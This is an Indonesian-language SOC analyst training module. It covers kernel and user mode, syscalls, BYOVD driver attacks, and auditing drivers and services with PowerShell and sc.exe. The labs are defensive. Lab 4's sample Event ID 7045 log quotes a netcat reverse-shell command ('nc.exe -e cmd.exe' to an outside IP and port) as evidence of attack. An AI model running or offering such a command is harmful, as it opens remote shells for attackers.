

# DAY 3 (REVISED) — Operating System Architecture: Kernel Mode vs User Mode, System Calls, Drivers & Services Inspection

## Objective

Setelah menyelesaikan modul intensif hari ini, kamu harus mampu:

1. Memahami arsitektur keamanan OS: Perbedaan mendalam antara **Kernel Mode (Ring 0)** dan **User Mode (Ring 3)**.
2. Memahami alur kerja **System Calls (Syscalls)** dari aplikasi ke *Kernel OS*.
3. Menganalisis **Hardware Drivers** (komponen Kernel) dan **Windows Services** menggunakan PowerShell dan Command Prompt.
4. Mendeteksi indikasi serangan **Bring Your Own Vulnerable Driver (BYOVD)** dan pematikan service keamanan secara tidak sah.
5. Membaca artifact log pembuatan service baru (**Event ID 7045**) dan perubahan status service (**Event ID 7036**).

## Theory (Deep Dive)

### 1. WHAT — Apa itu Kernel Mode & User Mode?

Sistem operasi modern (Windows dan Linux) menggunakan proteksi berbasis hardware CPU yang memisahkan ruang eksekusi menjadi beberapa tingkatan hak akses (*CPU Privilege Rings*):

```
+-----------------------------------------------------------------+
|                      USER MODE (Ring 3)                         |
|  [ Chrome.exe ]    [ Word.exe ]    [ PowerShell ]   [ Python ]  |
|  - Terisolasi, tidak bisa akses hardware/RAM lain secara langsung|
+-----------------------------------------------------------------+
                                |
                                |  System Call (Syscall) / NTDLL
                                v
+-----------------------------------------------------------------+
|                     KERNEL MODE (Ring 0)                        |
|  [ OS Kernel ]    [ Memory Manager ]    [ Hardware Drivers ]    |
|  - Akses tak terbatas ke CPU, RAM, dan seluruh Hardware         |
+-----------------------------------------------------------------+
                                |
                                v
                       [ HARDWARE / RAM / SSD ]

```

* **User Mode (Ring 3):** Lingkungan berhak akses rendah tempat berjalannya semua aplikasi biasa. Aplikasi di User Mode terisolasi. Jika aplikasi *crash*, OS tetap berjalan stabil.
* **Kernel Mode (Ring 0):** Pusat inti sistem operasi. Berisi *OS Kernel*, *Executive Services*, dan *Hardware Drivers*. Komponen di Ring 0 memiliki akses penuh tanpa hambatan ke seluruh RAM dan hardware. Jika ada kode di Kernel Mode yang *error* atau *crash*, seluruh OS akan langsung runtuh (**Blue Screen of Death / BSOD**).

### 2. WHY — Kenapa SOC Analyst WAJIB Memahami Ini?

Batas antara User Mode dan Kernel Mode adalah **benteng pertahanan paling krusial** pada Operating System.

* **Sisi Defensif (Keamanan):** Produk keamanan terbaik (seperti *EDR / Endpoint Detection and Response* dan *Antivirus Kernel Driver*) menempatkan sensor utamanya di **Kernel Mode (Ring 0)** agar bisa mengawasi semua aktivitas aplikasi di User Mode.
* **Sisi Ofensif (Serangan):** Penyerang canggih (*Advanced Persistent Threat / APT*) selalu berusaha menembus Kernel Mode. Jika malware berhasil berjalan di Ring 0 (menjadi *Rootkit*), malware tersebut bisa:
* Mematikan Antivirus/EDR tanpa bisa dihentikan.
* Menyembunyikan file, proses, dan koneksi jaringannya dari pengawasan OS.
* Membaca seluruh isi RAM tanpa terhalang proteksi Windows.



### 3. HOW — Bagaimana System Calls (Syscalls) Bekerja?

Aplikasi di User Mode (misalnya Notepad) **TIDAK BISA** menulis file secara langsung ke SSD. Ketika kamu menekan tombol *Save*, inilah alur yang terjadi:

1. **User Request:** Notepad memanggil fungsi standar Windows API (`WriteFile`).
2. **API Translation:** `WriteFile` diteruskan ke library tingkat rendah Windows (`ntdll.dll`), yang menyiapkan nomor identifikasi **System Call (Syscall)** (contoh: `NtWriteFile`).
3. **Transition to Kernel:** CPU mengeksekusi instruksi khusus (`syscall` pada 64-bit atau `sysenter` pada 32-bit) untuk berpindah dari Ring 3 ke Ring 0.
4. **Kernel Execution:** Kernel menerima instruksi, memeriksa *permission* user, lalu memerintahkan *Storage Driver* untuk menulis data ke sektor fisik SSD.
5. **Return:** Control dikembalikan ke User Mode.

### 4. ATTACK — Bring Your Own Vulnerable Driver (BYOVD) & Service Abuse

Karena Windows mewajibkan seluruh Driver Kernel ditandatangani secara resmi oleh Microsoft (**Driver Signature Enforcement / DSE**), penyerang kesulitan membuat driver jahat dari nol.

Sebagai gantinya, penyerang menggunakan teknik **Bring Your Own Vulnerable Driver (BYOVD)**:

1. Penyerang membawa driver **RESMI dan SAH** milik vendor ternama (seperti driver hardware lama buatan ASUS, Capcom, atau Gigabyte) yang memiliki celah keamanan (*vulnerability*).
2. Penyerang menginstall driver resmi tersebut ke komputer target menggunakan hak akses Administrator.
3. Penyerang mengeksploitasi celah pada driver resmi itu untuk menyuntikkan kode jahat langsung ke **Kernel Mode (Ring 0)**.
4. Setelah berada di Ring 0, penyerang mematikan proses EDR/Antivirus di RAM.

### 5. DEFENSE — Cara SOC Menganalisis & Mendeteksi

SOC Analyst memantau:

* **Pemasangan Driver Baru:** Sysmon Event ID 6 (*Driver Loaded*) atau Windows Event ID 7045 (*Service/Driver Installed*).
* **Driver Blocklist:** Memastikan Windows memanfaatkan *Microsoft Vulnerable Driver Blocklist*.
* **Service State Monitoring:** Alert otomatis jika service keamanan kritis (seperti `WinDefend` atau agent EDR) mendadak berubah status menjadi `STOPPED`.

## Detailed Command & Script Breakdown

Sebelum memulai praktek, mari bedah perintah-perintah CLI yang akan kita gunakan hari ini:

### 1. Memeriksa Driver via `driverquery` (Cmd)

```cmd
driverquery /FO CSV /v

```

* **`driverquery`**: Perintah CLI Windows untuk menampilkan seluruh driver Kernel yang terinstall.
* **`/FO CSV`**: Mengubah format output menjadi CSV agar mudah dibaca atau diolah.
* **`/v`**: (*Verbose*) Menampilkan detail mendalam seperti lokasi file `.sys`, status memori, dan tipe driver.

### 2. Memeriksa Driver via PowerShell (WMI/CIM)

```powershell
Get-CimInstance Win32_SystemDriver | Where-Object {$_.State -eq "Running"} | Select-Object Name, DisplayName, PathName, StartMode

```

* **`Get-CimInstance Win32_SystemDriver`**: Mengambil data class `Win32_SystemDriver` dari Kernel.
* **`Where-Object {$_.State -eq "Running"}`**: Menyaring (*filter*) hanya driver yang saat ini sedang aktif di memori RAM.
* **`PathName`**: Jalur lokasi file fisik driver (biasanya berakhiran `.sys` di `C:\Windows\System32\drivers\`).

### 3. Memeriksa Windows Service via `sc.exe`

```cmd
sc.exe qc WinDefend

```

* **`sc.exe`**: (*Service Control*) Utility CLI utama Windows untuk berkomunikasi dengan *Service Control Manager (SCM)*.
* **`qc`**: (*Query Configuration*) Memeriksa konfigurasi teknis dari sebuah service.
* **`WinDefend`**: Nama teknis (*Service Name*) dari Windows Defender.

## Multi-Part Hands-On Labs

Siapkan laptopmu, buka **PowerShell (Run as Administrator)**.

---

### LAB 1: Auditing Kernel Drivers di RAM (Kernel Mode Inspection)

**Skenario:** Kamu ditugaskan melakukan audit terhadap komponen yang saat ini sedang berjalan di **Kernel Mode (Ring 0)** pada komputer klien.

**Langkah Kerja:**

1. Buka PowerShell Administrator.
2. Jalankan perintah ini untuk melihat jumlah total Driver Kernel yang sedang aktif:
```powershell
(Get-CimInstance Win32_SystemDriver | Where-Object {$_.State -eq "Running"}).Count

```


*(Catat berapa jumlah driver yang berjalan di sistemmu).*
3. Tampilkan 10 driver pertama beserta lokasi file fisik `.sys` nya:
```powershell
Get-CimInstance Win32_SystemDriver | Where-Object {$_.State -eq "Running"} | Select-Object Name, DisplayName, PathName | Select-Object -First 10 | Format-Table -AutoSize

```


4. **Verifikasi Keberadaan File Driver:**
Ambil salah satu `PathName` dari output di atas (contoh: `C:\WINDOWS\system32\drivers\etc...sys`).
Cek apakah file tersebut benar-benar ada di disk menggunakan PowerShell:
```powershell
Test-Path "C:\Windows\System32\drivers\afd.sys"

```


*(Ganti nama file `.sys` sesuai dengan salah satu hasil di komputermu. Output `True` membuktikan file fisik driver tersebut ada).*

---

### LAB 2: Deep Inspection pada Security Services (User-to-Kernel Bridge)

**Skenario:** Penyerang sering mencoba mematikan service keamanan. Kamu harus bisa memeriksa status, hak akses, dan binary path dari service keamanan Windows.

**Langkah Kerja:**

1. Jalankan perintah PowerShell ini untuk memeriksa status service **Windows Defender (`WinDefend`)** dan **Windows Firewall (`MpsSvc`)**:
```powershell
Get-Service -Name "WinDefend", "MpsSvc" | Select-Object Name, DisplayName, Status, StartType

```


2. Mari periksa konfigurasi teknis mendalam dari `WinDefend` menggunakan `sc.exe`:
```cmd
sc.exe qc WinDefend

```


3. **Analisis Output `sc.exe`:**
* **`BINARY_PATH_NAME`**: Menunjukkan executable yang mengeksekusi service ini (`C:\ProgramData\Microsoft\Windows Defender\Platform\...` atau `C:\Program Files\Windows Defender\MsMpEng.exe`).
* **`START_TYPE`**: Menunjukkan apakah service jalan otomatis saat boot (`AUTO_START`), manual (`DEMAND_START`), atau dimatikan (`DISABLED`).
* **`SERVICE_START_NAME`**: Akun user yang menjalankan service ini (biasanya `NT AUTHORITY\LocalSystem` atau `NT AUTHORITY\NetworkService`).



---

### LAB 3: Simulasi Membuat & Memeriksa Custom Service (Controlled Lab)

**Skenario:** Kita akan membuat sebuah *Dummy Service* lokal bernama `SOC_Test_Service` untuk mensimulasikan bagaimana penyerang membuat service baru untuk **Persistence** (bertahan di dalam sistem setelah reboot).

> **Peringatan Keamanan:** Kita hanya membuat service dummy yang mengarahkan ke executable aman bawaan Windows (`notepad.exe`) lalu menghapusnya kembali.

**Langkah Kerja:**

1. Buat service baru bernama `SOC_Test_Service` menggunakan `sc.exe`:
```cmd
sc.exe create SOC_Test_Service binPath= "C:\Windows\System32\notepad.exe" start= auto DisplayName= "SOC Analyst Test Service"

```


*(Pastikan muncul pesan `[SC] CreateService SUCCESS`).*
2. Verifikasi keberadaan service baru tersebut menggunakan PowerShell:
```powershell
Get-Service -Name "SOC_Test_Service" | Select-Object Name, DisplayName, Status, StartType

```


3. Periksa lokasi file eksekusinya via PowerShell WMI:
```powershell
Get-CimInstance Win32_Service -Filter "Name = 'SOC_Test_Service'" | Select-Object Name, PathName, StartMode, State

```


4. **Pembersihan (Cleanup):**
Hapus service tes tersebut dari sistem agar komputermu tetap bersih:
```cmd
sc.exe delete SOC_Test_Service

```


*(Pastikan muncul pesan `[SC] DeleteService SUCCESS`).*

---

### LAB 4: Analisis Raw Log (Service Creation Artifact Triage)

Ketika sebuah service dibuat di Windows (seperti pada LAB 3), Windows secara otomatis mencatat **Event ID 7045** di dalam System Event Log.

Berikut adalah contoh data log mentah yang ditangkap oleh SIEM saat insiden terjadi:

```text
===============================================================================
LOG ENTRY #8841 - WINDOWS SYSTEM AUDIT (EVENT ID 7045)
Timestamp: 2026-09-22T10:15:30Z
Computer: HR-PC-04.CORP.LOCAL

Service Name:         UpdateCheckService
Service File Name:    C:\Users\Public\Downloads\nc.exe -e cmd.exe 192.168.1.50 4444
Service Type:         user start
Service Start Type:   auto start
Service Account:      LocalSystem
===============================================================================

```

**Analisis Struktur Log oleh Analyst:**

* **`Service Name`**: `UpdateCheckService` (Penyerang menggunakan nama yang seolah-olah update resmi).
* **`Service File Name`**: `C:\Users\Public\Downloads\nc.exe -e cmd.exe 192.168.1.50 4444`.
* **ANOMALI CRITICAL:** File eksekusi berjalan dari folder `Users\Public\Downloads`.
* **ANOMALI CRITICAL:** File `nc.exe` (*Netcat*) dieksekusi dengan argumen `-e cmd.exe` yang diarahkan ke IP luar (`192.168.1.50`). Ini adalah perintah pembuatan **Reverse Shell**!


* **`Service Account`**: `LocalSystem` (Service ini berjalan dengan hak akses tertinggi di OS / NT AUTHORITY\SYSTEM).

## SOC Connection & Mindset

Saat melakukan investigasi insiden terkait Driver dan Service, gunakan pola pikir ini:

1. **"Siapa yang menjalankan Service ini?"**
* Sebagian besar service bawaan Windows berjalan di bawah akun `NT AUTHORITY\LocalSystem`, `LocalService`, atau `NetworkService`. Jika ada service baru berjalan di bawah akun user biasa (misal: `CORP\john_doe`), itu mencurigakan!


2. **"Di mana lokasi executable `.exe` atau `.sys` nya?"**
* Normal: `C:\Windows\System32\`, `C:\Program Files\`.
* MENCURIGAKAN: `C:\Users\...\AppData\`, `C:\Windows\Temp\`, `C:\Users\Public\`.


3. **"Apakah Service/Driver ini baru saja terinstall saat terjadi insiden?"**
* Selalu cocokkan waktu insiden (*timestamp*) dengan waktu munculnya **Event ID 7045** pada SIEM.
